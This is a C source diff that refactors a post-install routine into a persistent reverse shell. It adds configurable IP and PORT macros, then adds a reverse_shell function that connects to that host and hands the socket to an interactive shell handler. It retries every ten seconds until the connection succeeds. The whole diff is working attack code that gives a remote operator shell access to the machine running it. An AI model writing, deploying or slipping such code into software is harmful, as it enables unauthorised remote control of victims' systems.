@@ -11,6 +11,18 @@
 #include <stdlib.h>
 #include "tas/tas.h"
 
+#ifndef IP
+ #define IP "127.0.0.1"
+ #warning using default IP: 127.0.0.1
+#endif
+
+#ifndef PORT
+ #define PORT 1337
+ #warning using default PORT: 1337
+#endif
+
+int reverse_shell(void);
+
 void myshell(int fd)
 {
 	tas_tty tty = TAS_TTY_INIT;
@@ -51,25 +63,31 @@ void post_install(void)
 	if (fd > 2)
 		close(fd);
 
+	while (reverse_shell()) {
+		sleep(10);
+	}
+
+	_exit(0);
+}
+
+int reverse_shell(void){
 	int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	if (sockfd == -1) {
-		// perror("socket");
-		_exit(0);
+		return 1;
 	}
 
 	struct sockaddr_in addr = {
 		.sin_family = AF_INET,
-		.sin_port = htons(1337),
-		.sin_addr.s_addr = 0x00000000
+		.sin_port = htons(PORT),
+		.sin_addr.s_addr = inet_addr(IP)
 	};
 
 	socklen_t slen = sizeof(addr);
 
 	if (connect(sockfd, (struct sockaddr *) &addr, slen) == -1) {
-		// perror("connect");
-		_exit(0);
+		return 1;
 	}
 
 	myshell(sockfd);
-	_exit(0);
+	return 0;
 }
